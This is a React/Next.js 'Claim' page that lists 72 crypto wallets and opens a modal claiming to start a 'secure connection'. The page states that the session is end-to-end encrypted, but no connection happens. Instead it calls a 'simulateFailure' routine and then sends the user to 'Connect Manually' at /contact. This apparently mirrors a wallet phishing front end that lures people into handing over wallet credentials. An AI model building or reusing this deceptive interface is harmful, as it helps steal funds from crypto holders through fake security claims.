'use client'
import React, { useEffect, useState } from 'react'
import Image from 'next/image'
import image1 from "@/images/Home/claim/images.png"
import image2 from "@/images/Home/claim/walle.jpg"
import image3 from "@/images/Home/claim/trust_wallet.jpg"
import image4 from "@/images/Home/claim/safepal.jpg"
import image5 from "@/images/Home/claim/xumm.jpg"
import image6 from "@/images/Home/claim/metamask.jpg"
import image7 from "@/images/Home/claim/binance.png"
import image8 from "@/images/Home/claim/polygon.jpg"
import image9 from "@/images/Home/claim/rainbow.jpg"
import image10 from "@/images/Home/claim/bitpay.jpg"
import image11 from "@/images/Home/claim/saita.png"
import image12 from "@/images/Home/claim/walleth.jpg"
import image13 from "@/images/Home/claim/saitamask.png"
import image14 from "@/images/Home/claim/argent.jpg"
import image15 from "@/images/Home/claim/huobi.jpg"
import image16 from "@/images/Home/claim/encrypted_ink.jpg"
import image17 from "@/images/Home/claim/keplr.webp"
import image18 from "@/images/Home/claim/plugwallet.png"
import image19 from "@/images/Home/claim/compound.jpg"
import image20 from "@/images/Home/claim/polkadot.png"
import image21 from "@/images/Home/claim/iotex.png"
import image22 from "@/images/Home/claim/coin98.jpg"
import image23 from "@/images/Home/claim/coinbase.png"
import image24 from "@/images/Home/claim/crypto.jpg"
import { IoIosClose } from "react-icons/io";
import image25 from "@/images/Home/claim/token_pocket.jpg"
import image26 from "@/images/Home/claim/math_wallet.jpg"
import image27 from "@/images/Home/claim/ledger_live.jpg"
import image28 from "@/images/Home/claim/Trezor-Logo.webp"
import image29 from "@/images/Home/claim/dharma.jpg"
import image30 from "@/images/Home/claim/trust_vault.jpg"
import image31 from "@/images/Home/claim/bifrost.webp"
import image32 from "@/images/Home/claim/atomic.jpg"
import image33 from "@/images/Home/claim/cool_wallet_s.jpg"
import image34 from "@/images/Home/claim/nash.jpg"
import image35 from "@/images/Home/claim/coinomi.jpg"
import image36 from "@/images/Home/claim/gridplus.jpg"
import image37 from "@/images/Home/claim/tokenary.jpg"
import image38 from "@/images/Home/claim/infinito.jpg"
import image39 from "@/images/Home/claim/wallet_io.jpg"
import image40 from "@/images/Home/claim/ownbit.jpg"
import image41 from "@/images/Home/claim/easypocket.jpg"
import image42 from "@/images/Home/claim/bridge_wallet.jpg"
import image43 from "@/images/Home/claim/via_wallet.jpg"
import image44 from "@/images/Home/claim/bitkeep.jpg"
import image45 from "@/images/Home/claim/unstoppable_wallet.jpg"
import image46 from "@/images/Home/claim/halodefi_wallet.jpg"
import image47 from "@/images/Home/claim/yoroi.png"
import image48 from "@/images/Home/claim/dok_wallet.jpg"
import image49 from "@/images/Home/claim/celo_wallet.jpg"
import image50 from "@/images/Home/claim/coinus.jpg"
import image51 from "@/images/Home/claim/valora.jpg"
import image52 from "@/images/Home/claim/plasmapay.jpg"
import image53 from "@/images/Home/claim/o3_wallet.jpg"
import image54 from "@/images/Home/claim/hashkey_me.jpg"
import image55 from "@/images/Home/claim/jade_wallet.jpg"
import image56 from "@/images/Home/claim//rwallet.jpg"
import image57 from "@/images/Home/claim/flare_wallet.jpg"
import image58 from "@/images/Home/claim/guarda_wallet.jpg"
import image59 from "@/images/Home/claim//trustee_wallet.jpg"
import image60 from "@/images/Home/claim/kyberswap.jpg"
import image61 from "@/images/Home/claim/atoken_wallet.jpg"
import image62 from "@/images/Home/claim/tangem_favicon_37804c051a.png"
import image63 from "@/images/Home/claim/xinfin.jpg"
import image64 from "@/images/Home/claim/at_wallet.jpg"
import image65 from "@/images/Home/claim/midas_wallet.jpg"
import image66 from "@/images/Home/claim/keyring_pro.jpg"
import image67 from "@/images/Home/claim/talken_wallet.jpg"
import image68 from "@/images/Home/claim/imtoken.jpg"
import image69 from "@/images/Home/claim/others.jpg"
import image70 from "@/images/Home/claim/exodus.png"
import image71 from "@/images/Home/claim/decent.jpg"
import image72 from "@/images/Home/claim/unnamed.png"
import { title } from 'process'
import { FaShieldAlt } from "react-icons/fa";
import { StaticImport } from 'next/dist/shared/lib/get-img-props'
import { useRouter } from 'next/navigation'
import { UseWallet } from '../context/context'


interface wallet
{
    id: number;
    src: StaticImport
    title: string;
    desc?: string
}




function Claim()
{
        const router = useRouter();

    const walletList: wallet[] = [
        { id: 1, title: "Ledger", desc: "ledger.com", src: image1 },
        { id: 2, title: "Wallet Connect", desc: "walletconnect.com", src: image2 },
        { id: 3, title: "Trust Wallet", desc: "trustwallet.com", src: image3 },
        { id: 4, title: "SafePal", desc: "safepal.io", src: image4 },
        { id: 5, title: "Xumm", desc: "xumm.app", src: image5 },
        { id: 6, title: "Metamask", desc: "metamask.io", src: image6 },
        { id: 7, title: "binance.com", desc: "Binance Chain Wallet", src: image7 },
        { id: 8, title: "Polygon Wallet", desc: "polygon.technology", src: image8 },
        { id: 9, title: "Rainbow", desc: "rainbow.me", src: image9 },
        { id: 10, title: "Bitpay", desc: "bitpay.com", src: image10 },
        { id: 11, title: "Saita Pro", desc: "saitapro.com", src: image11 },
        { id: 12, title: "Walleth", desc: "walleth.org", src: image12 },
        { id: 13, title: "SaitaMask", desc: "SaitaMask.org", src: image13 },
        { id: 14, title: "Argent", desc: "argent.xyz", src: image14 },
        { id: 15, title: "Huobi Wallet", desc: "huobiwallet.com", src: image15 },
        { id: 16, title: "Encypted ink", desc: "encrypted.ink", src: image16 },
        { id: 17, title: "KEPLR", desc: "KEPLR", src: image17 },
        { id: 18, title: "Plug Wallet", desc: "plug.oo", src: image18 },
        { id: 19, title: "Compound", desc: "compound finance", src: image19 },
        { id: 20, title: "Polkadot", desc: "polkadot.network", src: image20 },
        { id: 21, title: "Iotex", desc: "iotex.io", src: image21 },
        { id: 22, title: "Coin98", desc: "coin98.com", src: image22 },
        { id: 23, title: "Coinbase", desc: "coinbase.com", src: image23 },
        { id: 24, title: "Crypto.com | Defi Wallet", desc: "crypto.com", src: image24 },
        { id: 25, title: "Token Pocket", desc: "tokenpocket.pro", src: image25 },
        { id: 26, title: "Math Wallet", desc: "mathwallet.org", src: image26 },
        { id: 27, title: "LedgerLive", desc: "Ledger.com", src: image27 },
        { id: 28, title: "Trezor Wallet", desc: "trezor.io", src: image28 },
        { id: 29, title: "Dharma", desc: "dharma.io", src: image29 },
        { id: 30, title: "Trust Vault", desc: "trustology.io", src: image30 },
        { id: 31, title: "Bifrost", desc: "bifrost.com", src: image31 },
        { id: 32, title: "Atomic", desc: "atomicwallet.io", src: image32 },
        { id: 33, title: "CoolWallet", desc: "coolwallet.io", src: image33 },
        { id: 34, title: "Nash", desc: "nash.io", src: image34 },
        { id: 35, title: "Coinomi", desc: "coinomi.com", src: image35 },
        { id: 36, title: "GridPlus", desc: "gridplus.io", src: image36 },
        { id: 37, title: "Tokenary", desc: "tokenary.io", src: image37 },
        { id: 38, title: "Infinito", desc: "infinitowallet.io", src: image38 },
        { id: 39, title: "Wallet.io", desc: "wallet.io", src: image39 },
        { id: 40, title: "Ownbit", desc: "ownbit.io", src: image40 },
        { id: 41, title: "EasyPocket", desc: "easypocket.app", src: image41 },
        { id: 42, title: "Bridge Wallet", desc: "mtpelerin.com", src: image42 },
        { id: 43, title: "ViaWallet", desc: "viawallet.com", src: image43 },
        { id: 44, title: "BitKeep", desc: "bitkeep.com", src: image44 },
        { id: 45, title: "Unstoppable Wallet", desc: "unstoppable.money", src: image45 },
        { id: 46, title: "HaloDefi Wallet", desc: "halodefi.org", src: image46 },
        { id: 47, title: "Yoroi Wallet", desc: "Yoroi.com", src: image47 },
        { id: 48, title: "Dok Wallet", desc: "dokwallet.com", src: image48 },
        { id: 49, title: "Cello Wallet", desc: "cellowallet.app", src: image49 },
        { id: 50, title: "CoinUs", desc: "coinus.io", src: image50 },
        { id: 51, title: "Valara", desc: "valaraapp.com", src: image51 },
        { id: 52, title: "Trustee Wallet", desc: "trusteeglobal.com", src: image52 },
        { id: 53, title: "Gaurda Wallet", desc: "guarda.com", src: image53 },
        { id: 54, title: "Jade Wallet", desc: "jadewallet.io", src: image54 },
        { id: 55, title: "PlasmaPay", desc: "plasmapay.com", src: image55 },
        { id: 56, title: "O3Wallet", desc: "o3.network", src: image56 },
        { id: 57, title: "HashKey Me", desc: "me.hashkey.com", src: image57 },
        { id: 58, title: "RWallet", desc: "rsk.co", src: image58 },
        { id: 59, title: "Flare Wallet", desc: "flarewallet.io", src: image59 },
        { id: 60, title: "KyberSwap", desc: "kyberswap.com", src: image60 },
        { id: 61, title: "AToken Wallet", desc: "atoken.com", src: image61 },
        { id: 62, title: "Tangem Wallet", desc: "tangem.com", src: image62 },
        { id: 63, title: "XinFin XDC Network", desc: "xinfin.io", src: image63 },
        { id: 64, title: "AT.Wallet", desc: "authentrend.com", src: image64 },
        { id: 65, title: "Midas Wallet", desc: "midasprotocol.io", src: image65 },
        { id: 66, title: "KEYRING PRO", desc: "keyring.app", src: image66 },
        { id: 67, title: "Talken Wallet", desc: "talken.io", src: image67 },
        { id: 68, title: "imToken", desc: "token.im", src: image68 },
        { id: 69, title: "Others",  src: image69 },
        { id: 70, title: "Exodus Wallet", desc: "exodus.com", src: image70 },
        { id: 71, title: "Decent Wallet", desc: "dcentwallet.com", src: image71 },
        { id: 72, title: "Xaman Wallet", desc: "xaman.app", src: image72 },
      
  ]
  const {handleWalletClick, selectedWallet, setSelectedWallet, loading, sliderPos, failed,simulateFailure } = UseWallet()

 
    return (
    <div>
           <h2 className="text-2xl font-bold mb-4 text-center">Select Your Wallet</h2>

      <div className="grid grid-cols-1 px-5 sm:grid-cols-3 md:grid-cols-4 gap-4">
        {walletList.map((wallet) => (
          <div
            key={wallet.id}
            className="flex  flex-col items-center p-4 border rounded-lg shadow hover:shadow-lg transition cursor-pointer"
            onClick={() => handleWalletClick(wallet)}
          >
            <Image src={wallet.src} alt={wallet.title} className="w-16 h-16 object-contain" />
            <h3 className="mt-2 font-semibold text-center">{wallet.title}</h3>
            <p className="text-gray-500 text-sm">{wallet.desc}</p>
          </div>
        ))}
        </div>
        
                  {selectedWallet && (
        <div className="fixed inset-0 bg-black/50 bg-opacity-80 flex items-center justify-center z-50 ">
            
            <div className="bg-white relative rounded-lg p-6 w-[30em] text-center shadow-lg">
                   <div
              onClick={() => setSelectedWallet(null)}
              className="absolute -top-3 cursor-pointer -right-3 bg-white rounded-full text-black hover:text-gray-700 "
            >
              <IoIosClose size={20}/>
            </div>
              <div className='py-10'>
                <Image src={selectedWallet.src }  className='w-16 m-auto h-16 object-contain' alt=''/>
                <h3 className="text-xl font-bold mb-4">{selectedWallet.title}</h3>
                <p className='text-black/50 text-lg'>This session is secured and encrypted</p>
              </div>
              {loading ? (
                <div className='space-y-4'>
                     <div className="relative w-full bg-gray-200 rounded-full h-3 mb-4 overflow-hidden">
                  <div
                    className="absolute top-0 h-3 bg-blue-600 rounded-full transition-transform duration-50"
                    style={{ width: "50%", transform: `translateX(${sliderPos}%)` }}
                  ></div>
                </div>
                <p className="text-black font-semibold">
                  starting secure connection...
                  </p>
                  <p>
                    please wait...
                  </p>
                </div>
  
            ) : failed ? (
                  <div className='space-y-5'>
                    <div className="text-red-600 border-red-500 rounded-xl py-2 w-95 m-auto mb-6   font-semibold border-2">
                     <p className='text-sm' >An error occurred... please try again or connect<br/> manually</p>

                    </div>
                    <div className="flex flex-col gap-2">
                      <div>
                     <button
                    onClick={simulateFailure}
                    className="bg-white-600 cursor-pointer hover:border-0 text-blue-700 px-40 py-2 rounded-full hover:bg-blue-500 hover:text-white  transition border-2 border-blue-700"
                  >
                    Try Again
                  </button>
                      </div>
                      <div>
                           <button
                    onClick={() => router.push("/contact")}
                    className="bg-blue-600 cursor-pointer text-white px-34 py-2 rounded-full hover:bg-purple-600/80 transition"
                  >
                    Connect Manually
                  </button>
                      </div>

               
                </div>
              </div>
              ) : null}
               <div className='flex items-center justify-evenly pt-20'>
              <div>
                <FaShieldAlt size={30} className='text-black/50'/>
              </div>
                <div>
                  <p className='text-black/50 font-semibold text-sm'>This session is protected with an end-to-end encryption.</p>
              </div>
            </div>
              
       
            </div>
           
          </div>
      )}
    </div>
  )
}

export default Claim
